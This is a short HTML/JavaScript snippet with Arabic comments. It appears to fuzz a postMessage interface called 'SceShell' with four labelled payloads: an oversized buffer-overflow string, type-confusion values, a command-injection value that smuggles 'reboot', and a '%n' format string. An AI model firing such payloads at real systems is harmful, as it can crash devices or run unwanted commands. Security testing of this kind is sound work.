<script>
    window.addEventListener('message', (event) => {
        alert("RESPONSE: " + JSON.stringify(event.data));
    });

    const maliciousPayloads = [
        // 1. اختبار الحجم (Buffer Overflow)
        {cmd: 'a'.repeat(10000), target: 'SceShell'},
        // 2. اختبار القيم غير المتوقعة (Type Confusion)
        {cmd: null, target: 12345},
        // 3. اختبار الحقن (Injection Attempt)
        {cmd: 'status; reboot;', target: 'SceShell'},
        // 4. اختبار الـ Format String (אם ممكن)
        {cmd: '%s%s%s%s%n', target: 'SceShell'}
    ];

    maliciousPayloads.forEach(p => {
        window.postMessage(p, '*');
    });
</script>
